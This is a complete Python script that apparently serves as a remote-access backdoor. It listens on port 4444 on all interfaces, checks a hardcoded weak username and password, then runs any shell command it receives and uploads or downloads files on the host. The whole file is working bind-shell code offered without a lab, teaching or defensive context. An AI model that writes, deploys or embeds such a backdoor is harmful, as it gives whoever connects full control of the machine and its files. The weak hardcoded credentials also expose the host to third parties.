import socket
import os
import subprocess

HOST = '0.0.0.0'
PORT = 4444
USERNAME = "Laith"
PASSWORD = "12345"

def send_msg(conn, msg):
    conn.sendall(msg.encode() + b"<END>")

def recv_msg(conn):
    data = b""
    while not data.endswith(b"<END>"):
        data += conn.recv(1024)
    return data[:-5].decode()

def handle_client(conn):
    conn.send(b"Username: ")
    username = recv_msg(conn)
    conn.send(b"Password: ")
    password = recv_msg(conn)

    if username != USERNAME or password != PASSWORD:
        send_msg(conn, "Authentication failed.")
        conn.close()
        return

    send_msg(conn, f"Authenticated.\n[DIR]{os.getcwd()}")

    while True:
        command = recv_msg(conn).strip()

        if command.lower() in ['exit', 'quit']:
            break

        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
                send_msg(conn, f"[DIR]{os.getcwd()}")
            except Exception as e:
                send_msg(conn, f"Error: {e}\n[DIR]{os.getcwd()}")

        elif command.startswith("download "):
            path = command[9:].strip()
            if os.path.isfile(path):
                try:
                    with open(path, 'rb') as f:
                        conn.sendall(f.read() + b"<FILEEND>")
                except Exception as e:
                    conn.send(f"Error reading file: {e}".encode() + b"<FILEEND>")
            else:
                conn.send(b"File not found<FILEEND>")

        elif command.startswith("upload "):
            path = command[7:].strip()
            with open(path, 'wb') as f:
                while True:
                    chunk = conn.recv(1024)
                    if b"<FILEEND>" in chunk:
                        chunk = chunk.replace(b"<FILEEND>", b"")
                        f.write(chunk)
                        break
                    f.write(chunk)
            send_msg(conn, f"Upload complete.\n[DIR]{os.getcwd()}")

        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                send_msg(conn, output.decode() + f"\n[DIR]{os.getcwd()}")
            except subprocess.CalledProcessError as e:
                send_msg(conn, e.output.decode() + f"\n[DIR]{os.getcwd()}")

    conn.close()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")
    conn, addr = server.accept()
    print(f"[+] Connection from {addr}")
    handle_client(conn)
